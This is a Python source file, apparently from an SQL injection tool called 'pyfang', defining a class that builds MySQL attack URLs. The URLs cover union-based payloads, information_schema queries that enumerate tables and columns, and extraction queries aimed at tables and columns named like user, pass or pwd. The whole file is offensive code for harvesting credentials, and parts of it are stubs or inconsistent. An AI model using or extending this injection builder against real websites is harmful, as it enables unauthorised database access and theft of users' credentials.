#!/usr/bin/python

class Builder:
    """ Builds the following SQLi types:
        i)      Error-based
        ii)     Union-based
        iii)    Blind 
            a)     Comparative Pre-Computation
    """

    def __init__(self, page, mysql_params):
        # Come from driver pyfang
        self.page = page
        self.union_params = mysql_params
        self.schema_params = ['table_name']
        self.table_keywords = ['user', 'usr', 'password', 'pass', 'pwd']
        self.column_keywords = ['user', 'usr', 'password', 'pass', 'pwd']
        self.exclude = set(open('./lists/mysql/excluded_tables').readlines())

        # Default values, can be changed in flag
        self.offset = 0
        self.delimiter = '%20' # or /**/, etc., add more later
        self.union_string = self.delimiter + 'UNION' + self.delimiter + 'SELECT' 
        self.null_url = page.split('=')[0] + '=null'

    def null_page(self):
        return self.null_url

    def union_nums(self, num_cols):
        cols = [self.delimiter + str(i + self.offset) for i in xrange(1, num_cols + 1)]
        return self.null_url + self.union_string + ','.join(cols)


    """
    def union_nums(self, num_cols):
         Creates the part of the SQLI after 'UNION SELECT'.
            :num_cols: Number of columns in vulnerable statement. 
                Must be matched by UNION SELECT 1,2,...
            :returns: List of strings. It's a list because the visible numbers 
                will be changed to pull data.
        
        return [self.delimiter + str(i + self.offset) for i in xrange(1, num_cols + 1)]
    """


    def error():
        return 0

    def union(self, num_cols, magic_col, i_type):
        """ :num_cols:  Number of columns for UNION statement.
            :magic_col: Column number that is most visible, and therefore used for injection parameter.
            :returns:   Dict of strings. All basic union-based injections.
            :i_type:    Injection type. String or int?
        """
        injections = {}
        union_urls = self.union_nums(num_cols) 
        for param in self.union_params:
            union_urls[magic_col - 1] = self.delimiter + param
            injections[param] = self.null_url + self.union_string + ','.join(union_urls)

        return injections 

    def tables(self, num_cols, magic_col):
        """ Uses information_schema.columns to get tables in DB.
            :num_cols:  Number of columns for UNION statement.
            :magic_col: Column number that is most visible, and therefore used for injection parameter.
            :returns:   Dict of strings. Queries regarding information_schema.
        """
        injections = {}
        union_urls = self.union_nums(num_cols) 
        for param in self.schema_params:
            union_urls[magic_col - 1] = self.delimiter + param
            injections[param] = self.null_url + self.union_string + ','.join(union_urls)
            injections[param] += self.delimiter + 'from' + self.delimiter + 'information_schema.columns'

        return injections 

    
    def columns(self, num_cols, magic_col, tables):
        """ Build SQLI to get columns of all specified tables.
            Default behavior parses list of tables for those that has specific sub-strings.
            :num_cols:  Number of columns for UNION statement.
            :magic_col: Column number that is most visible, and therefore used for injection parameter.
            :tables:    List of tables to get columns for.
            :returns:   Dict of strings->strings. Key table_name, value SQLi for columns.
        """

        injections = {}
        union_urls = self.union_nums(num_cols) 
        union_urls[magic_col - 1] = self.delimiter + 'column_name' 
        a = self.null_url + self.delimiter + self.union_string + ','.join(union_urls)
        a += self.delimiter + 'from' + self.delimiter + 'information_schema.columns'
        a += self.delimiter + 'where' + self.delimiter + 'table_name='
        
        for table in tables:
            if any(i in str(table).lower() for i in self.table_keywords):
                injections[table] = a + "'" + table + "'"

        return injections

    def rows(self, num_cols, magic_col, table, columns):
        """ Build SQLI to get values of each column in a specified table.
            Default behavior only returns queries about columns in self.column_keywords.
            :num_cols:      Number of columns for UNION statement.
            :magic_col:     Column number that is most visible, and therefore used for injection parameter.
            :table:         String representing table name.
            :columns:       List of column names in table.
            :returns:       Dict of strings->strings with queries regarding table's columns.
        """

        injections = {}
        union_urls = self.union_nums(num_cols) 

        for column in columns:
            if any(i in str(column).lower() for i in self.column_keywords):
                union_urls[magic_col - 1] = self.delimiter + column
                injections[column] = self.null_url + self.union_string + ','.join(union_urls)
                injections[column] += self.delimiter + 'from' + self.delimiter + table

        return injections 

    def blind():
        return 0

    def comparative_precomputation(self):
        """ Creates a dictionary to pre-compute all possible values for some parameter.
            These values are hashed and compared later to perform more efficient blind sqli.
            :returns:   Dict of strings.
        """

        lookup = {i: self.page.split('=')[0] + '=' + str(i) for i in xrange(0,255)}
        lookup['null'] = self.null_url

        return lookup



